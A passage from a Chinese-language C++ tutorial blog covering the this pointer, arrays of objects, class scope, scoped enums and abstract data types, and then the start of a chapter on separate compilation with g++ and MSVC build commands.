std::cerr &lt;&lt; &quot;Error: Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cerr &lt;&lt; &quot;Error: You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;void Stock::show() const &#123; // 使用 iomanip 来设置格式可能更清晰 std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125; 10.3.6 构造函数和析构函数小结 构造函数: 与类同名，无返回类型。 在创建对象时自动调用，用于初始化对象。 可以重载（提供不同的参数列表）。 如果没有定义任何构造函数，编译器会生成一个默认构造函数（无参数，什么也不做）。 如果定义了任何构造函数，编译器不再生成默认构造函数；如果需要无参数构造，必须自己定义。 析构函数: 类名前加 ~，无返回类型，无参数。 在对象销毁时自动调用，用于清理资源。 不能重载，一个类只有一个析构函数。 如果类中使用了 new 分配资源，通常需要在析构函数中使用 delete 来释放。 构造函数和析构函数是 C++ 类机制的重要组成部分，它们确保了对象的正确初始化和资源的安全释放，是实现资源获取即初始化 (RAII - Resource Acquisition Is Initialization) 这一重要 C++ 编程范式的基石。 10.4 this 指针在 C++ 类的成员函数内部，你有时可能需要引用调用该函数的对象本身。例如，当你在 stock1.show() 的实现代码中，如何明确地指代 stock1 这个对象？C++ 为此提供了一个特殊的指针，称为 this 指针。 this 指针是什么？this 是一个隐含的指针，它存在于每个非静态成员函数（non-static member function）内部。它指向调用该成员函数的那个对象。 当你调用 stock1.show() 时，在 show() 函数的内部，this 指针就指向 stock1 对象。 当你调用 stock2.buy(..) 时，在 buy() 函数的内部，this 指针就指向 stock2 对象。 编译器在调用成员函数时，会隐式地将对象的地址传递给该函数，这个地址就被 this 指针所持有。 关键点： 隐含参数: this 指针是作为隐含参数传递给非静态成员函数的。你不需要在函数参数列表中显式声明它。 指向调用对象: 它总是指向当前正在执行其成员函数的那个对象。 类型: this 指针的类型是 ClassName * const（对于非 const 成员函数）或 const ClassName * const（对于 const 成员函数）。这意味着 this 指针本身是一个常量指针（不能让它指向其他对象），并且对于 const 成员函数，它指向一个 const 对象（不能通过 this 修改对象的数据成员）。 访问成员: 在成员函数内部，当你直接访问数据成员（如 shares）或调用其他成员函数（如 set_tot()）时，实际上是编译器隐式地使用了 this 指针，等同于 this-&gt;shares 或 this-&gt;set_tot()。 使用 this 指针大多数情况下，你不需要显式地使用 this 指针，因为编译器会自动处理。例如，在 Stock::buy 函数中： 1234567891011121314void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; // ... &#125; else &#123; // shares += num; // 隐式使用 this-&gt;shares // share_val = price; // 隐式使用 this-&gt;share_val // set_tot(); // 隐式调用 this-&gt;set_tot() // 下面是显式使用 this 的等效写法： this-&gt;shares += num; this-&gt;share_val = price; this-&gt;set_tot(); &#125;&#125; 然而，在某些特定场景下，显式使用 this 指针是必要的或有用的： 区分同名参数和成员: 当成员函数的参数名与数据成员名相同时，需要使用 this-&gt; 来明确指定访问的是数据成员。 1234567891011121314151617class Example &#123;private: int value;public: // 参数名 value 与数据成员 value 相同 Example(int value) &#123; // 必须使用 this-&gt;value 来引用数据成员 this-&gt;value = value; &#125; void print() const &#123; std::cout &lt;&lt; value &lt;&lt; std::endl; &#125; // 这里访问的是成员 value&#125;;int main() &#123; Example ex(10); // 调用构造函数 ex.print(); // 输出 10 return 0;&#125; (虽然这种命名方式有时会用到，但一些编码规范建议避免参数名和成员名完全相同，例如使用 m_value 或 value_ 作为成员名) 返回对象自身的引用或指针: 当成员函数需要返回调用该函数的对象本身时（通常是为了支持**方法链式调用 (Method Chaining)**）。 12345678910111213141516171819202122232425262728293031class Counter &#123;private: int count = 0;public: Counter&amp; increment() &#123; // 返回类型是 Counter&amp; count++; return *this; // 返回调用对象自身的引用 &#125; Counter&amp; add(int val) &#123; // 返回类型是 Counter&amp; count += val; return *this; // 返回调用对象自身的引用 &#125; void display() const &#123; std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; count &lt;&lt; std::endl; &#125;&#125;;int main() &#123; Counter c; c.display(); // Output: Count: 0 // 方法链式调用 c.increment().add(5).increment(); // 先调用 increment(), 返回 c 的引用； // 再对 c 调用 add(5), 返回 c 的引用； // 最后对 c 调用 increment() c.display(); // Output: Count: 7 return 0;&#125; 在 increment() 和 add() 中，return *this; 返回的是调用对象（c）的引用，使得可以在其后继续调用该对象的其他成员函数。 在友元函数或独立函数中传递对象: 虽然 this 本身只在成员函数内可用，但你可以将 *this（对象本身）或 this（对象地址）传递给需要操作该对象的其他函数。 this 与 Stock 类让我们看看 this 如何应用于之前的 Stock 类。假设我们想添加一个方法，用于比较两个 Stock 对象的总价值，并返回总价值较高的那个对象的引用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 在 stock.h 的类定义中添加声明class Stock &#123; // ... private members ...public: // ... constructors, destructor, buy, sell, update, show ... // 新增方法：比较总价值，返回价值更高的对象的引用 // 第一个const（返回值前）：表示返回的引用是常量，不能被修改 // 第二个const（参数中） ：表示参数是常量引用，函数内不能修改参数 // 第三个const（函数末尾）：表示这是一个常量成员函数，不能修改调用对象的成员变量 const Stock&amp; topval(const Stock&amp; s) const;&#125;;// 在 stock.cpp 中添加定义#include &quot;stock.h&quot;// ... 其他定义 ...// 定义 topval 方法const Stock&amp; Stock::topval(const Stock&amp; s) const &#123; // this-&gt;total_val 是调用该方法的对象 (e.g., stock1) 的总价值 // s.total_val 是传入的参数对象 (e.g., stock2) 的总价值 if (s.total_val &gt; this-&gt;total_val) &#123; return s; // 返回传入的对象 s &#125; else &#123; return *this; // 返回调用该方法的对象自身 (*this) &#125; // 注意：函数声明和定义末尾的 const 表示此函数不会修改任何 Stock 对象， // 因此 this 的类型是 const Stock* const，*this 的类型是 const Stock&amp;&#125;// 使用示例#include &lt;iostream&gt;#include &quot;stock.h&quot;int main() &#123; Stock stock1(&quot;Company A&quot;, 100, 10.0); // total_val = 1000.0 Stock stock2(&quot;Company B&quot;, 50, 25.0); // total_val = 1250.0 stock1.show(); stock2.show(); const Stock&amp; top = stock1.topval(stock2); // 调用 stock1.topval，传入 stock2 // 内部比较 s(stock2).total_val 和 this(stock1)-&gt;total_val // 因为 stock2 价值更高，返回 stock2 的引用 std::cout &lt;&lt; &quot;\\nTop value stock:\\n&quot;; top.show(); // 显示的是 stock2 的信息 return 0;&#125; 在这个例子中，this-&gt;total_val 明确表示访问的是调用 topval 函数的那个对象（stock1）的 total_val 成员，而 s.total_val 访问的是作为参数传递进来的对象（stock2）的 total_val。return *this; 则返回了调用对象 stock1 本身的引用。 总结 this 是一个指向调用对象的指针，在非静态成员函数内部可用。 它使得成员函数能够访问和操作调用它的那个特定对象的数据成员和成员函数。 大多数情况下，this 的使用是隐式的。 显式使用 this 主要用于： 区分同名的参数和数据成员。 从成员函数中返回调用对象自身的引用或指针（常用于方法链）。 this 指针的类型取决于成员函数是否为 const。 10.5 对象数组就像可以创建 int、double 或 char 的数组一样，你也可以创建类对象的数组。数组的每个元素都是一个该类的对象。 声明对象数组声明对象数组的语法与声明基本类型数组类似： 1ClassName arrayName[numberOfElements]; 例如，要创建一个包含 4 个 Stock 对象的数组： 1234#include &quot;stock.h&quot; // 假设 Stock 类定义在此const int STKS = 4;Stock myStocks[STKS]; // 创建一个包含 4 个 Stock 对象的数组 构造函数的调用当程序创建对象数组时，它需要为数组中的每个元素（对象）调用构造函数。 默认构造函数: 如果在声明数组时没有为元素提供显式的初始化值，程序将为数组中的每个元素调用类的**默认构造函数 (Default Constructor)**。 在上面的例子 Stock myStocks[STKS]; 中，Stock::Stock() 这个默认构造函数将被调用 4 次，为 myStocks[0], myStocks[1], myStocks[2], myStocks[3] 这四个对象进行初始化。 重要: 如果类没有默认构造函数（例如，你只定义了带参数的构造函数，而没有定义无参数的构造函数或使用 = default），那么尝试创建像 Stock myStocks[STKS]; 这样的未初始化数组将导致编译错误。 带参数的构造函数: 你可以在声明数组时使用初始化列表来为数组元素指定不同的构造函数调用。 1234567891011121314#include &quot;stock.h&quot;const int STKS = 2;Stock portfolio[STKS] = &#123; Stock(&quot;NanoSmart&quot;, 12, 20.0), // 调用 Stock(const string&amp;, long, double) Stock(&quot;Boffo Objects&quot;, 200, 2.0) // 调用 Stock(const string&amp;, long, double)&#125;;// C++11 及以后版本可以使用更简洁的列表初始化Stock investments[] = &#123; // 编译器会自动计算数组大小 (3) Stock(&quot;Fleep Co&quot;, 5, 15.5), Stock(), // 调用默认构造函数 Stock() Stock(&quot;MacroHard&quot;, 18, 75.0)&#125;; 在 portfolio 数组的例子中，portfolio[0] 使用提供的参数调用 Stock(const string&amp;, long, double) 构造函数，portfolio[1] 也一样。 在 investments 数组的例子中，investments[0] 和 investments[2] 调用带参数的构造函数，而 investments[1] 则显式调用了默认构造函数 Stock()。 如果初始化列表提供的初始值数量少于数组大小，则剩余的元素将使用默认构造函数进行初始化。如果类没有默认构造函数，这将导致编译错误。 12345Stock funds[4] = &#123; Stock(&quot;A Corp&quot;, 10, 1.0), Stock(&quot;B Ltd&quot;, 20, 2.0) // funds[2] 和 funds[3] 将使用默认构造函数 Stock() 初始化&#125;; 访问对象数组成员访问数组中对象的成员与访问基本类型数组元素类似，先用索引 [] 选择数组中的特定对象，然后使用点号 . 访问该对象的公有成员（数据或函数）。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &quot;stock.h&quot;const int STKS = 4;int main() &#123; // 使用初始化列表创建并初始化数组 Stock stocks[STKS] = &#123; Stock(&quot;NanoSmart&quot;, 12, 20.0), Stock(&quot;Boffo Objects&quot;, 200, 2.0), Stock(&quot;Monolithic Obelisks&quot;, 130, 3.25), Stock(&quot;Fleep Enterprises&quot;, 60, 6.5) &#125;; std::cout &lt;&lt; &quot;Stock holdings:\\n&quot;; int st; for (st = 0; st &lt; STKS; st++) &#123; stocks[st].show(); // 调用数组中第 st 个对象的 show() 方法 &#125; // 找到价值最高的股票 (使用上一节的 topval 假设它已添加) // 注意：topval 需要添加到 Stock 类中才能编译 /* const Stock* top = &amp;stocks[0]; // 假设第一个是最高的 for (st = 1; st &lt; STKS; st++) &#123; top = &amp;top-&gt;topval(stocks[st]); // 比较并更新 top 指针 &#125; std::cout &lt;&lt; &quot;\\nMost valuable holding:\\n&quot;; top-&gt;show(); // 显示价值最高的股票信息 */ // 修改数组中某个对象的状态 std::cout &lt;&lt; &quot;\\nBuying more Boffo Objects...\\n&quot;; stocks[1].buy(50, 2.5); // 调用 stocks[1] 对象的 buy() 方法 stocks[1].show(); return 0;&#125; 输出示例 (假设 topval 部分被注释掉): 123456789101112131415161718192021Constructor using NanoSmart calledConstructor using Boffo Objects calledConstructor using Monolithic Obelisks calledConstructor using Fleep Enterprises calledStock holdings:Company: NanoSmart Shares: 12 Share Price: $20.000 Total Worth: $240.00Company: Boffo Objects Shares: 200 Share Price: $2.000 Total Worth: $400.00Company: Monolithic Obelisks Shares: 130 Share Price: $3.250 Total Worth: $422.50Company: Fleep Enterprises Shares: 60 Share Price: $6.500 Total Worth: $390.00Buying more Boffo Objects...Company: Boffo Objects Shares: 250 Share Price: $2.500 Total Worth: $625.00Bye, Fleep Enterprises!Bye, Monolithic Obelisks!Bye, Boffo Objects!Bye, NanoSmart! 注意：程序结束时，数组 stocks 中的每个对象的析构函数都会被调用（按与构造相反的顺序）。 动态对象数组你也可以使用 new 来创建动态的对象数组。 12int size = 5;Stock *portfolio = new Stock[size]; // 创建包含 5 个 Stock 对象的动态数组 默认构造函数要求: 使用 new ClassName[size] 这种形式时，必须要求类具有可访问的默认构造函数，因为它会为数组中的每个元素调用默认构造函数。 C++11 列表初始化 (可选): C++11 允许在使用 new 创建数组时提供初始化列表，这样可以调用特定的构造函数，并且如果提供了所有元素的初始化值，则不强制要求默认构造函数。 1234567891011// C++11 or laterStock *p_list = new Stock[3] &#123; Stock(&quot;X Inc&quot;, 1, 1.0), Stock(&quot;Y Ltd&quot;, 2, 2.0), Stock(&quot;Z LLC&quot;, 3, 3.0)&#125;;Stock *p_partial = new Stock[4] &#123; Stock(&quot;A&quot;, 1, 1.0), Stock(&quot;B&quot;, 2, 2.0) // p_partial[2] 和 p_partial[3] 需要默认构造函数&#125;; 访问: 访问动态数组成员可以使用数组表示法 portfolio[i].member 或指针表示法 (portfolio + i)-&gt;member。 释放内存: 必须使用 delete [] 来释放动态分配的对象数组，以确保每个对象的析构函数都被正确调用。 123delete [] portfolio; // 调用 5 次析构函数，然后释放内存delete [] p_list;delete [] p_partial; 错误: 使用 delete portfolio; 只会调用第一个元素的析构函数，并可能导致内存泄漏或未定义行为。 总结 可以像创建基本类型数组一样创建对象数组。 创建对象数组时，会为每个元素调用构造函数。 如果未提供显式初始化，则调用默认构造函数。因此，对于未初始化的数组或使用 new ClassName[size] 创建的动态数组，类必须有可访问的默认构造函数。 可以使用初始化列表为数组成员指定不同的构造函数。 通过 arrayName[index].member 的方式访问数组成员。 动态对象数组使用 new ClassName[size] 创建，并必须使用 delete [] arrayPtr 释放。 10.6 类作用域我们已经知道，在函数内部或代码块内部定义的变量具有局部作用域（块作用域）。类似地，在类中定义的名称（数据成员、成员函数、嵌套类型、枚举等）也有其特定的作用域，称为**类作用域 (Class Scope)**。 类作用域的规则: 内部可见性: 在类声明或成员函数定义内部，可以直接访问类的成员（数据成员、成员函数、枚举等），无需特殊限定。 外部访问限制: 在类的外部，不能直接访问类的成员。必须通过对象（使用点号 . 或箭头 -&gt;）或者通过类名和作用域解析运算符 ::（对于静态成员、嵌套类型或枚举）来访问。 名称隔离: 类作用域意味着在一个类内部定义的名称不会与在另一个类或全局作用域中定义的同名名称冲突。例如，两个不同的类可以都有一个名为 count 的数据成员。 示例: 12345678910111213141516171819202122232425262728293031class ClassA &#123;public: int count; // ClassA 的 count void process() &#123; value = 10; &#125; // 可以直接访问 valueprivate: int value; // ClassA 的 value&#125;;class ClassB &#123;public: double count; // ClassB 的 count (与 ClassA::count 不冲突) void calculate() &#123; /* ... */ &#125;&#125;;int global_count = 100; // 全局变量int main() &#123; ClassA objA; ClassB objB; objA.count = 1; // 访问 ClassA 对象的 count 成员 objB.count = 2.5; // 访问 ClassB 对象的 count 成员 // 错误！不能直接访问类内部的名称 // count = 5; // 访问哪个 count？ // value = 20; // 错误！value 在类作用域内 objA.process(); // 通过对象调用成员函数 return 0;&#125; 作用域解析运算符 :: 当我们需要在类外部引用类作用域内的名称时（例如，在定义成员函数或访问静态成员时），就需要使用类名和作用域解析运算符 ::。 12345// 在类外部定义成员函数void ClassA::process() &#123; // 使用 ClassA:: 指明 process 属于 ClassA value = 10; // 在成员函数内部，可以直接访问其他成员 this-&gt;count = 5; // 也可以显式使用 this&#125; 10.6.1 作用域为类的常量有时，我们希望在类中定义一个常量，这个常量对于该类的所有对象来说都是一样的，并且可能在编译时就需要知道它的值（例如，用于指定数组大小）。 有几种方法可以在类作用域内创建常量： static const 成员 (整型或枚举类型 - C++11 前常用): 对于整型（int, char, bool 等）或枚举类型的常量，可以在类定义内部使用 static const 直接初始化。static 意味着这个常量属于类本身，而不是任何特定对象（所有对象共享同一个常量），const 意味着它的值不能被修改。 12345678910111213class Bakery &#123;private: // 这个常量属于类，所有对象共享 static const int Months = 12; // 声明并初始化静态常量成员 double costs[Months];public: // ...&#125;;// 注意：如果需要在类外部获取该常量的地址，// 或者编译器要求（较旧的编译器可能需要），// 可能还需要在源文件中提供一个定义（不带初始值）：// const int Bakery::Months; // 可选的定义 这种方式不能用于初始化非整型或非枚举类型的静态常量。 static constexpr 成员 (C++11 及以后): C++11 引入了 constexpr，它允许在编译时计算常量表达式。使用 static constexpr 可以定义各种类型的类作用域常量，只要初始化表达式是常量表达式即可。这是现代 C++ 中定义类常量的推荐方式。 1234567891011121314class Config &#123;public: static constexpr int MaxUsers = 100; static constexpr double Rate = 1.5; static constexpr const char* DefaultMsg = &quot;Welcome&quot;; // ...&#125;;int main() &#123; int userLimit = Config::MaxUsers; // 直接使用类名访问 double currentRate = Config::Rate; // ... return 0;&#125; static constexpr 成员默认是内联的，通常不需要在类外部再次定义。 枚举技巧 (Enum Hack - C++11 前的变通方法): 在 C++11 之前，如果想在类中定义一个非整型的常量（或者只是想避免 static const 可能需要的外部定义），有时会使用匿名枚举。 1234567class LegacyBox &#123;private: enum &#123; MaxSize = 100 &#125;; // 枚举技巧 int items[MaxSize]; // 使用枚举量作为数组大小public: // ...&#125;; MaxSize 就像一个值为 100 的整型常量，但它是一个枚举量。这种方法现在已不常用，static constexpr 是更好的选择。 10.6.2 作用域内枚举 (Scoped Enumerations - C++11)传统的 C++ 枚举（enum）存在一些问题： 名称冲突: 枚举量（enumerators）被放置在与枚举定义相同的作用域中，容易与其他名称（包括其他枚举的枚举量）发生冲突。 隐式转换: 枚举量可以隐式地转换为整型，有时这可能导致逻辑错误或降低类型安全性。 1234567enum OldColor &#123; RED, GREEN, BLUE &#125;;enum StopLight &#123; RED, YELLOW, GREEN &#125;; // 错误！RED 和 GREEN 重定义OldColor myColor = RED; // OKint colorValue = myColor; // OK, 隐式转换为 int (值为 0)if (myColor == 0) &#123; /* ... */ &#125; // 可以和整数比较 为了解决这些问题，C++11 引入了**作用域内枚举 (Scoped Enumerations)**，使用 enum class 或 enum struct 关键字定义。 特点: 作用域限制: 枚举量的作用域被限制在枚举本身内部。访问枚举量必须使用枚举名称和作用域解析运算符 ::。 无隐式转换: 作用域内枚举类型不能隐式地转换为整型或其他类型。如果需要转换，必须使用显式类型转换（如 static_cast）。 类型安全: 增强了类型安全性，不同作用域枚举类型的值不能直接比较（除非重载了比较运算符）。 可指定底层类型: 可以显式指定枚举使用的底层整数类型（默认为 int）。 语法: 1234enum class EnumName : UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;// 或者 enum struct (功能相同)enum struct EnumName : UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;// : UnderlyingType 是可选的 示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;// 使用 enum class 定义作用域内枚举enum class Color : unsigned char &#123; // 指定底层类型为 unsigned char RED, // Color::RED GREEN, // Color::GREEN BLUE // Color::BLUE&#125;;enum class TrafficLight &#123; RED, // TrafficLight::RED (与 Color::RED 不冲突) YELLOW, GREEN&#125;;int main() &#123; Color myColor = Color::RED; // 必须使用作用域解析符 TrafficLight light = TrafficLight::GREEN; // 错误！枚举量不在当前作用域 // Color anotherColor = RED; // 错误！不能隐式转换为 int // int colorCode = myColor; // 需要显式转换 int colorCode = static_cast&lt;int&gt;(myColor); unsigned char underlyingValue = static_cast&lt;unsigned char&gt;(myColor); std::cout &lt;&lt; &quot;Color code: &quot; &lt;&lt; colorCode &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Underlying value: &quot; &lt;&lt; static_cast&lt;int&gt;(underlyingValue) &lt;&lt; std::endl; // 输出 0 (需要再次转换才能打印为数字) // 错误！不同枚举类型不能直接比较 // if (myColor == light) &#123; /* ... */ &#125; // 可以与相同类型的枚举量比较 if (myColor == Color::RED) &#123; std::cout &lt;&lt; &quot;The color is red.&quot; &lt;&lt; std::endl; &#125; if (light == TrafficLight::GREEN) &#123; std::cout &lt;&lt; &quot;The light is green.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 作用域内枚举是现代 C++ 中定义枚举类型的首选方式，因为它更安全、更不容易出错，并且避免了名称污染。 总结 类成员（数据、函数、类型、常量、枚举）具有类作用域。 在类外部访问类成员需要通过对象（. 或 -&gt;）或类名（::）。 类作用域可以隔离名称，防止与全局或其他类中的名称冲突。 可以使用 static const (整型/枚举) 或 static constexpr (C++11, 推荐) 在类内部定义常量。 C++11 引入了**作用域内枚举 (enum class 或 enum struct)**，其枚举量作用域限制在枚举内，且不能隐式转换为整型，提高了代码的安全性和清晰度。 10.7 抽象数据类型我们在本章中学习的类是 C++ 实现抽象数据类型 (Abstract Data Type, ADT) 的一种方式。ADT 是一种计算机科学的概念，它是一种数学模型，用于描述具有特定行为（语义）的数据类型，重点在于可以对数据执行的操作，而不是这些操作的具体实现方式或数据的内部表示。 ADT 的核心思想: 数据封装: ADT 将数据以及对这些数据进行操作的函数捆绑在一起。 接口与实现分离: ADT 定义了一个公共接口 (Interface)**，即一组可以对数据执行的操作。用户通过这个接口与数据交互，而不需要知道数据是如何存储的，或者操作是如何实现的（实现细节隐藏**）。 可以把 ADT 想象成一个“黑盒子”。你知道你可以给这个盒子提供什么输入（通过接口调用操作），以及你会得到什么输出或结果，但你不需要（也不能）看到盒子内部的构造。 与内置类型的类比: 想想 C++ 的内置类型 int。 数据: 它可以表示整数。 操作: 你可以对 int 执行加、减、乘、除、比较等操作。 抽象: 你使用这些操作时，并不需要关心 int 在内存中是如何用二进制位表示的，或者加法操作在 CPU 层面是如何执行的。你只关心操作的效果。 ADT 将这种思想扩展到了用户自定义的数据类型。 C++ 类如何实现 ADT: C++ 类天然地支持 ADT 的概念： 数据表示: 类的数据成员（通常是 private）用于存储 ADT 的数据。 操作接口: 类的公有成员函数（public methods）定义了 ADT 的公共接口，即允许外部代码执行的操作。 实现隐藏: 将数据成员设为 private，并将实现细节（如私有辅助函数、成员函数的具体代码）与接口（类定义中的公有声明）分离，实现了数据隐藏和封装。 以 Stock 类为例: 我们可以将 Stock 类视为一个“股票持有” ADT。 ADT 描述: 一个表示某公司股票持有情况的类型。 数据 (概念上): 公司名称、持有股数、当前股价、总价值。 操作 (接口): 创建一个股票持有记录（构造函数）。 买入指定数量的股票（buy 方法）。 卖出指定数量的股票（sell 方法）。 更新股票价格（update 方法）。 显示股票持有信息（show 方法）。 (可能还有) 获取总价值、获取公司名称等。 实现 (隐藏细节): 数据成员 company, shares, share_val, total_val 的具体类型（std::string, long, double）。 私有辅助函数 set_tot() 的存在及其实现。 buy, sell, update, show 等函数的具体代码逻辑。 使用 Stock 类的程序员（客户端代码）只需要了解其公共接口（public 方法）。他们可以创建 Stock 对象，调用 buy(), sell(), show() 等方法来完成任务，而无需关心 total_val 是如何计算和更新的，或者 company 是用 std::string 还是 C 风格字符串存储的。如果类的设计者决定改变内部实现（例如，优化 set_tot 的计算），只要公共接口保持不变，客户端代码就无需修改。 ADT 的好处: 抽象: 简化复杂性，让用户关注“做什么”而非“怎么做”。 封装: 保护数据不被意外破坏，隐藏实现细节。 模块化: 将程序分解为独立的、功能明确的单元（类/ADT）。 可维护性: 修改一个 ADT 的内部实现不会影响使用该 ADT 的其他代码（只要接口不变）。 可重用性: 设计良好的 ADT 可以在不同的程序中重复使用。 因此，在设计 C++ 类时，以 ADT 的思维方式进行思考——明确这个类代表什么概念，它应该提供哪些操作（公共接口），以及需要隐藏哪些内部细节——是非常有益的。这有助于创建出结构清晰、易于使用和维护的代码。 10.8 总结本章介绍了面向对象编程（OOP）的核心概念，并深入探讨了 C++ 实现 OOP 的主要机制——**类 (Class)**。类是用户定义类型的基础，它允许我们将数据和操作数据的函数封装在一起。 主要内容回顾： 过程性编程 vs. 面向对象编程: 过程性编程关注执行步骤和函数，而面向对象编程关注数据及其相关操作，将它们封装在对象 (Object) 中。OOP 的核心思想包括封装、抽象、继承和多态。 抽象和类: 抽象是关注本质特征、忽略实现细节的过程。 类是创建对象的蓝图，定义了对象的数据成员（属性）和成员函数（方法）。 访问说明符（public, private, protected）控制对类成员的访问。public 成员构成类的公共接口，而 private 成员（通常是数据）实现了数据隐藏，是封装的关键。 类的成员函数通常在类定义中声明，在单独的源文件中使用作用域解析运算符 :: 定义。 通过类的对象使用**点号 .**（或指针使用箭头 -&gt;）访问其公有成员。 构造函数和析构函数: 构造函数是与类同名的特殊成员函数，在创建对象时自动调用，用于初始化对象。它可以被重载。如果用户未定义任何构造函数，编译器会生成一个默认构造函数（无参）。如果用户定义了任何构造函数，编译器就不再生成默认构造函数。 析构函数是类名前加 ~ 的特殊成员函数，在对象生命周期结束时自动调用，用于执行清理工作（如释放 new 分配的内存）。它没有参数，不能重载。 this 指针: 每个非静态成员函数都有一个隐含的 this 指针，指向调用该函数的对象。 通常隐式使用，但在需要区分同名参数和成员、或需要返回对象自身引用/指针（如链式调用）时显式使用 this 或 *this。 对象数组: 可以创建类对象的数组。 创建数组时，会为每个元素调用构造函数（通常是默认构造函数，除非使用初始化列表）。 访问方式为 arrayName[index].member。 动态对象数组使用 new ClassName[size] 创建，需要默认构造函数，并用 delete [] ptr 释放。 类作用域: 类成员（数据、函数、类型、常量、枚举）具有类作用域，在类外部访问需要限定。 可以使用 static const 或 static constexpr (C++11 推荐) 定义类范围内的常量。 C++11 引入了**作用域内枚举 (enum class)**，提高了枚举的类型安全性和作用域控制。 抽象数据类型 (ADT): ADT 是一个侧重于操作接口而非内部实现的数学模型。 C++ 类是实现 ADT 的强大工具，通过公共接口提供操作，通过私有成员隐藏实现细节，体现了封装和抽象的原则。 通过使用类，我们可以创建模块化、可重用、易于维护的复杂程序，更好地模拟现实世界的问题。掌握类的设计和使用是精通 C++ 的关键一步。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 9 内存模型和名称空间","slug":"Cpp_tutorial_Chapter_9","date":"2025-04-26T12:03:35.395Z","updated":"2025-04-26T12:02:22.963Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_9/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_9/","excerpt":"","text":"9.1 单独编译随着程序变得越来越大，将所有代码都放在一个巨大的 main.cpp 文件中会变得难以管理和维护。C++ 支持**单独编译 (Separate Compilation)**，允许我们将程序分解成多个独立的源文件（通常是 .cpp 文件）和头文件（通常是 .h 或 .hpp 文件）。 这样做的好处: 组织性: 将相关的函数、类等放在不同的文件中，使项目结构更清晰。 可重用性: 可以将通用的功能（如工具函数、类定义）放在单独的文件中，方便在其他项目中重用。 模块化: 每个文件可以专注于特定的功能模块。 编译效率: 当修改某个 .cpp 文件时，通常只需要重新编译该文件，然后与其他未改变的目标文件重新链接即可，无需重新编译整个项目，大大节省了编译时间。 基本概念单独编译通常涉及两种主要的文件类型： 头文件 (.h 或 .hpp): 目的: 包含**声明 (Declarations)**，告诉编译器某个函数、类或变量的“接口”是什么样的，但不包含具体的实现代码（除了模板和内联函数）。 典型内容: 函数原型（函数声明） 类 (class) 定义 结构 (struct) 定义 枚举 (enum) 定义 模板 (template) 定义 内联函数 (inline) 定义 const 常量定义 using 声明或指令 #include 指令: 源文件通过 #include &quot;header_file.h&quot; 指令将头文件的内容包含进来，以便编译器知道如何使用其中声明的函数或类。 包含卫哨 (Include Guards): 为了防止同一个头文件被意外地多次包含到同一个源文件中（这可能导致重定义错误），头文件通常使用包含卫哨。 123456789// myheader.h#ifndef MYHEADER_H_ // 如果 MYHEADER_H_ 还没有被定义过#define MYHEADER_H_ // 就定义 MYHEADER_H_// 头文件的实际内容放在这里...void my_function(int x);class MyClass &#123; /* ... */ &#125;;#endif // MYHEADER_H_ 或者使用 C++ 特有的 #pragma once 指令（更简洁，但不是所有编译器都支持，尽管非常普遍）： 123456// myheader.h#pragma once// 头文件的实际内容放在这里...void my_function(int x);class MyClass &#123; /* ... */ &#125;; 源文件 (.cpp): 目的: 包含**定义 (Definitions)**，即函数或方法的具体实现代码，以及全局变量的定义和初始化。 典型内容: 函数体（实现） 类成员函数的实现 全局变量的定义和初始化 main 函数（通常在一个单独的 .cpp 文件中） 编译: 每个 .cpp 文件通常会被编译器独立地编译成一个**目标文件 (Object File)**（通常是 .obj 或 .o 文件）。目标文件包含了该源文件对应的机器代码，但可能还包含对其他文件中定义的函数或变量的引用。 编译和链接过程在C++中，将源代码转换为可执行程序通常分为编译和链接两个主要阶段。让我们看看这些过程中涉及的具体命令： 编译命令使用g++（GNU C++ 编译器）: 123456789## 编译单个源文件g++ -c utils.cpp # 生成 utils.o 目标文件g++ -c main.cpp # 生成 main.o 目标文件## 添加优化选项g++ -c -O2 utils.cpp # 使用O2级别的优化## 添加调试信息g++ -c -g utils.cpp # 包含调试信息 使用MSVC（Microsoft Visual C++）: 123456789## 编译单个源文件cl /c utils.cpp # 生成 utils.obj 目标文件cl /c main.cpp # 生成 main.obj 目标文件## 添加优化选项cl /c /O2 utils.cpp # 使用O2级别的优化## 添加调试信息cl /c /Zi utils.cpp # 包含调试信息 链接命令使用g++: 12345## 链接目标文件生成可执行文件g++ main.o utils.o -o myprogram## 链接并指定库文件g++ main.o utils.o -lmath -o myprogram 使用MSVC: 12345## 链接目标文件生成可执行文件link main.obj utils.obj /OUT:myprogram.exe## 链接并指定库文件link main.obj utils.obj math.lib /OUT:myprogram.exe 一步完成编译和链接通常，我们可以在一个命令中完成编译和链接: 12345## 使用g++g++ main.cpp utils.cpp -o myprogram## 使用MSVCcl main.cpp utils.cpp /Fe:myprogram.exe 编译器会自动处理中间步骤，生成必要的目标文件，然后链接它们创建最终的可执行文件。 一个包含多个文件的 C++ 项目的典型构建过程如下： 编译 (Compilation): 编译器分别处理每个 .cpp 源文件。对于每个 .cpp 文件： 预处理器处理 